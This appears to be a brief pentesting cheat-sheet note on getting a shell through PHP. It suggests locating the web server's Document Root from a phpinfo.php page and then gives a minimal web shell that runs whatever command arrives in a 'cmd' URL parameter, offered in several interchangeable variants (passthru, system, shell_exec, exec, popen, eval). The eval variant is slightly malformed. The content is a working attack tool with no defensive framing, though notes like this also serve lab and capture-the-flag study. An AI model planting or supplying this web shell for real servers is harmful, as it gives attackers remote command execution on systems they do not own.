PHP
if you have access to phpinfo.php page, then always look for "Document Root" in the enumeration. 
here are some examples of getting shell using php script. after the <?php, each of the lines does the same thing, so just use one of them.
<?php

echo "<pre>";
passthru($_GET['cmd']);
system($_GET['cmd']);
shell_exec($_GET['cmd']);
exec($_GET['cmd']);
pOpen($_GET['cmd']);
eval("passthru('cmd')");

?>

